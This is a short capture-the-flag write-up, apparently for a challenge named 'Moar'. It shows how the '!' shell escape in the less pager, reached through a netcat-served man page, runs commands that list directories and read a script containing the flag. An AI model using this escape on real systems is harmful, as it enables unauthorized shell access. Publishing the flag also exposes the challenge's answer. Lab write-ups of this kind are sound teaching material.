# Moar

We're served a `man socat` page though netcat. 

It gives us `less` output.

Little do they know that we are able to execute arbitrary commands while running `less` starting with `!`

Let's try `!ls` 
```
bin   dev  home  lib64  mnt  proc  run   srv  tmp  var
boot  etc  lib   media  opt  root  sbin  sys  usr
!done  (press RETURN)!ls home
```

Great! Now `!ls home/moar` -> `disable_dmz.sh`

And finally `!cat home/moar/disable_dmz.sh` 
```
#!/bin/sh

# Copyright 2018 Google LLC
#
# Licensed under the Apache License, Version 2.0 (the "License");
# you may not use this file except in compliance with the License.
# You may obtain a copy of the License at
#
#     https://www.apache.org/licenses/LICENSE-2.0
#
# Unless required by applicable law or agreed to in writing, software
# distributed under the License is distributed on an "AS IS" BASIS,
# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
# See the License for the specific language governing permissions and
# limitations under the License.

echo 'Disabling DMZ using password CTF{SOmething-CATastr0phic}'
echo CTF{SOmething-CATastr0phic} > /dev/dmz
```

We got the flag `CTF{SOmething-CATastr0phic}`, but let's try to run the script `disable_dmz.sh`

```
Disabling DMZ using password CTF{SOmething-CATastr0phic}
/home/moar/disable_dmz.sh: 18: /home/moar/disable_dmz.sh: cannot create /dev/dmz: Read-only file system
```

Sad. :(